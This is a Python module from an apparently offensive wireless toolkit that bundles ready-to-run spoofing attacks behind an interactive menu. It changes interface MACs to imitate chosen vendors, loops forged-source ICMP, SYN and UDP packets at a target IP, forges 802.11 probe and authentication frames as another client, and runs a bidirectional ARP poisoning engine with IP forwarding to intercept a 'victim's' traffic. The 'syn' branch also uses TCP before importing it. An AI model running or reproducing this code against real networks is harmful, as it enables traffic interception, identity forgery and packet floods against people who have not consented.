"""
Spoofing engine - MAC changer, IP spoofing, MAC spoofing, ARP spoofing.

Professional-grade identity forging for engagements:
  * MAC changer        - set a custom / vendor / random MAC, restore original
  * MAC vendor lookup  - identify a device by OUI before spoofing it
  * IP spoofing        - craft raw packets with arbitrary source IP (Linux)
  * ARP spoofing       - standalone bidirectional poisoning engine
  * MAC spoofing       - forge 802.11 source addresses at frame level

Works on Linux natively (ip/iw); on Windows MAC spoofing degrades to a
registry-based warning since the OS forbids arbitrary MAC changes.
"""
import random
import socket
import struct
import threading
import time

from open80211.core import ui
from open80211.core import netutils as nu
from open80211.core import oui as oui_db
from open80211.core.config import is_linux, is_windows
from open80211.core.interfaces import get_mac, _run

try:
    from scapy.all import sendp, Ether, ARP, IP
except Exception:
    pass


# --------------------------------------------------------------------------
# MAC changer
# --------------------------------------------------------------------------

def mac_vendor(mac: str) -> str:
    return oui_db.lookup_vendor(mac) or "unknown"


def list_macs() -> list:
    """Current MAC for every interface with vendor attribution."""
    rows = []
    for i in _interfaces():
        rows.append([i["name"], i["mac"], mac_vendor(i["mac"]),
                     i.get("type", "?")])
    return rows


def _interfaces():
    try:
        import psutil
        import socket as s
        out = []
        for name, st in psutil.net_if_stats().items():
            mac = ""
            for a in psutil.net_if_addrs().get(name, []):
                if a.family == s.AF_LINK or a.family == -1:
                    mac = a.address
                    break
            out.append({"name": name, "mac": mac, "type": st.isup and "up" or "down"})
        return out
    except Exception:
        return []


def change_mac(iface: str, mac: str) -> bool:
    """Set a MAC address on an interface. Returns success."""
    if not is_linux():
        ui.warn("MAC change requires Linux. On Windows use a supported USB "
                "adapter's vendor utility instead.")
        return False
    if not nu.norm_mac(mac) or len(nu.norm_mac(mac)) != 17:
        ui.error("Invalid MAC address.")
        return False
    target = nu.norm_mac(mac)
    ui.info(f"Setting {iface} to {target} ...")
    old = get_mac(iface)
    _run(["ip", "link", "set", iface, "down"])
    _run(["ip", "link", "set", iface, "address", target])
    _run(["ip", "link", "set", iface, "up"])
    now = get_mac(iface)
    if now.lower() == target.lower():
        ui.ok(f"{iface} MAC changed {old} -> {now}")
        return True
    ui.error("MAC change failed. Some drivers reject unicast-locally-managed "
             "or multicast bits; try a vendor OUI MAC.")
    return False


def restore_mac(iface: str) -> bool:
    """Restore the factory MAC (from ethtool if available, else rebind)."""
    if not is_linux():
        return False
    ui.info(f"Restoring original MAC for {iface} ...")
    # Some drivers persist original MAC in ethtool output.
    out = _run(["ethtool", "-P", iface])
    mac = ""
    if "Permanent address" in out:
        mac = out.split("Permanent address:")[-1].strip().split()[0]
    if mac and mac != "00:00:00:00:00:00":
        return change_mac(iface, mac)
    # Fallback: unload/load the driver module to reset hardware MAC.
    sysfs = f"/sys/class/net/{iface}/device/driver"
    import subprocess
    try:
        mod = open(sysfs + "/module/name").read().strip()
        ui.info(f"Reloading driver module {mod} ...")
        subprocess.run(["modprobe", "-r", mod], capture_output=True)
        subprocess.run(["modprobe", mod], capture_output=True)
        time.sleep(1)
        ui.ok("Driver reloaded; hardware MAC restored.")
        return True
    except Exception as e:
        ui.error(f"Could not restore: {e}")
        return False


def mac_saver(iface: str):
    """Context helper: remember the MAC and restore it afterwards."""
    return _MacGuard(iface)


class _MacGuard:
    def __init__(self, iface: str):
        self.iface = iface
        self.original = get_mac(iface)

    def __enter__(self):
        return self

    def __exit__(self, *a):
        if self.original and is_linux():
            change_mac(self.iface, self.original)


# --------------------------------------------------------------------------
# IP spoofing (raw packet crafting)
# --------------------------------------------------------------------------

def ip_spoof_loop(iface: str, target_ip: str, spoofed_src: str,
                  count: int = 50, interval: float = 0.2,
                  proto: str = "icmp") -> None:
    """
    Fire packets at target_ip with spoofed source IP. proto in
    ('icmp','tcp','udp','syn'). Linux only (raw sockets).
    """
    if not is_linux():
        ui.warn("IP spoofing requires Linux + raw socket privileges.")
        return
    ui.section("IP Spoofing", f"src={spoofed_src} -> {target_ip}")
    ui.warn(f"Sending {count or 'continuous'} spoofed {proto.upper()} "
            f"packets... Ctrl+C to stop.")
    try:
        sent = 0
        while count == 0 or sent < count:
            if proto == "icmp":
                from scapy.all import ICMP
                pkt = IP(src=spoofed_src, dst=target_ip) / ICMP()
            elif proto == "syn":
                pkt = IP(src=spoofed_src, dst=target_ip) / TCP(dport=80, flags="S")
            elif proto == "udp":
                from scapy.all import UDP
                pkt = IP(src=spoofed_src, dst=target_ip) / UDP(dport=53)
            else:
                from scapy.all import TCP
                pkt = IP(src=spoofed_src, dst=target_ip) / TCP(dport=80, flags="PA")
            sendp(pkt, iface=iface, verbose=False)
            sent += 1
            time.sleep(interval)
        ui.ok(f"Sent {sent} spoofed packets.")
    except KeyboardInterrupt:
        ui.info("Stopped.")
    except Exception as e:
        ui.error(f"Send failed: {e} (need root / raw sockets)")


# --------------------------------------------------------------------------
# MAC spoofing at frame level (802.11)
# --------------------------------------------------------------------------

def mac_spoof_frame(iface: str, target_bssid: str, client_mac: str,
                    protocol: str = "probe") -> None:
    """Send 802.11 frames with a forged source MAC (monitor mode)."""
    if not is_linux():
        ui.warn("802.11 MAC spoofing needs Linux + monitor mode.")
        return
    try:
        from scapy.all import RadioTap, Dot11, Dot11ProbeReq, Dot11Auth, Dot11Elt
    except Exception:
        ui.error("scapy missing.")
        return
    ui.section("802.11 MAC Spoofing", f"forging source {client_mac}")
    bssid = nu.norm_mac(target_bssid)
    client = nu.norm_mac(client_mac)
    try:
        for _ in range(20):
            if protocol == "probe":
                pkt = RadioTap() / Dot11(type=0, subtype=4,
                                         addr1="ff:ff:ff:ff:ff:ff",
                                         addr2=client,
                                         addr3="ff:ff:ff:ff:ff:ff") / \
                    Dot11ProbeReq() / Dot11Elt(ID=0, info=b"OpenNetwork")
            else:  # auth
                pkt = RadioTap() / Dot11(type=0, subtype=11, addr1=bssid,
                                         addr2=client, addr3=bssid) / \
                    Dot11Auth(seqnum=1, status=0)
            sendp(pkt, iface=iface, verbose=False)
            time.sleep(0.05)
        ui.ok(f"Sent spoofed {protocol} frames as {client}.")
    except Exception as e:
        ui.error(str(e))


# --------------------------------------------------------------------------
# ARP spoofing engine (standalone, reusable)
# --------------------------------------------------------------------------

class ARPSpoofer:
    """Bidirectional ARP poisoning with optional packet forwarding toggle."""

    def __init__(self, iface: str, target_ip: str, gateway_ip: str = ""):
        self.iface = iface
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip or _auto_gateway()
        self._stop = threading.Event()
        self._thread = None
        self.packets_forwarded = 0

    def start(self) -> None:
        from open80211.core.config import set_ip_forward
        ui.section("ARP Spoofing", f"{self.target_ip} <-> {self.gateway_ip} via {self.iface}")
        set_ip_forward(True)
        ui.warn("Poisoning ARP tables... Ctrl+C to stop and restore.")
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def _loop(self):
        mac = get_mac(self.iface) or "00:00:00:00:00:00"
        while not self._stop.is_set():
            for src_ip, dst_ip in ((self.gateway_ip, self.target_ip),
                                   (self.target_ip, self.gateway_ip)):
                pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                    psrc=src_ip, pdst=dst_ip, hwsrc=mac)
                sendp(pkt, iface=self.iface, verbose=False)
                self.packets_forwarded += 1
            time.sleep(1.5)

    def stop(self) -> None:
        from open80211.core.config import set_ip_forward
        self._stop.set()
        if self._thread:
            self._thread.join(timeout=3)
        set_ip_forward(False)
        self._restore()
        ui.info("ARP tables restored.")

    def _restore(self):
        try:
            tmac = _resolve_mac(self.target_ip)
            gmac = _resolve_mac(self.gateway_ip)
            if tmac:
                sendp(Ether(dst=tmac) / ARP(psrc=self.gateway_ip, pdst=self.target_ip,
                                            hwsrc=gmac), iface=self.iface, verbose=False)
            if gmac:
                sendp(Ether(dst=gmac) / ARP(psrc=self.target_ip, pdst=self.gateway_ip,
                                            hwsrc=tmac), iface=self.iface, verbose=False)
        except Exception:
            pass


def _auto_gateway() -> str:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        return _gateway_for(s.getsockname()[0])
    except Exception:
        return "192.168.1.1"


def _gateway_for(ip: str) -> str:
    try:
        import ipaddress
        return str(ipaddress.ip_network(f"{ip}/24", strict=False).network_address + 1)
    except Exception:
        return "192.168.1.1"


def _resolve_mac(ip: str) -> str:
    try:
        from scapy.all import srp1
        ans = srp1(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=0)
        return ans.hwsrc if ans else ""
    except Exception:
        return ""


# --------------------------------------------------------------------------
# Menu
# --------------------------------------------------------------------------

def spoof_menu(iface: str) -> None:
    while True:
        choice = ui.menu("Spoofing / Identity Suite", [
            "MAC changer (vendor / random / custom)",
            "Restore original MAC",
            "List MACs + vendor lookup",
            "Vendor OUI database (search vendors)",
            "IP spoofing (raw packets)",
            "802.11 MAC spoofing (monitor mode frames)",
            "Standalone ARP spoofing",
        ])
        if choice == 0:
            return
        if choice == 1:
            mac_choice = ui.menu("MAC changer", [
                "Random vendor MAC (believeable)",
                "Pick a specific vendor (e.g. Apple)",
                "Custom MAC address",
            ])
            if mac_choice == 0:
                continue
            if mac_choice == 1:
                mac = oui_db.random_mac_with_vendor()
                ui.info(f"Generated: {mac} ({mac_vendor(mac)})")
            elif mac_choice == 2:
                query = ui.ask("Vendor name fragment (e.g. Samsung, Intel)")
                mac = oui_db.random_mac_with_vendor(query)
                ui.info(f"Generated: {mac} ({mac_vendor(mac)})")
            else:
                mac = ui.ask("MAC (aa:bb:cc:dd:ee:ff)")
            change_mac(iface, mac)
        elif choice == 2:
            restore_mac(iface)
        elif choice == 3:
            ui.show_table("Interfaces", ["Name", "MAC", "Vendor", "State"],
                          [[r[0], r[1], r[2], r[3]] for r in list_macs()])
        elif choice == 4:
            query = ui.ask("Search vendors (blank = show all)")
            rows = []
            for oui, vendor in oui_db.list_vendors():
                if not query or query.lower() in vendor.lower():
                    rows.append([oui, vendor])
            if rows:
                ui.show_table(f"OUI Database ({len(rows)} matches)",
                              ["OUI", "Vendor"], rows)
            else:
                ui.info("No matches. Vendor list is compact; add oui.txt to "
                        "the repo root to load the full IEEE database.")
        elif choice == 5:
            if not is_linux():
                ui.warn("IP spoofing needs Linux.")
                continue
            target = ui.ask("Target IP")
            src = ui.ask("Spoofed source IP", default="8.8.8.8")
            proto = ui.ask("Protocol (icmp/syn/udp)", default="icmp")
            n = ui.ask_int("Packets (0 = continuous)", default=50)
            ip_spoof_loop(iface, target, src, n or 0, proto=proto)
        elif choice == 6:
            bssid = ui.ask("AP BSSID")
            client = ui.ask("Forged client MAC")
            proto = ui.ask("Frame type (probe/auth)", default="probe")
            mac_spoof_frame(iface, bssid, client, proto)
        elif choice == 7:
            target = ui.ask("Target IP (victim)")
            gw = ui.ask("Gateway IP", default=_auto_gateway())
            if not target:
                ui.warn("Target IP required.")
                continue
            spoofer = ARPSpoofer(iface, target, gw)
            try:
                spoofer.start()
                ui.press_enter("Press Enter to stop the ARP poison...")
            except KeyboardInterrupt:
                pass
            finally:
                spoofer.stop()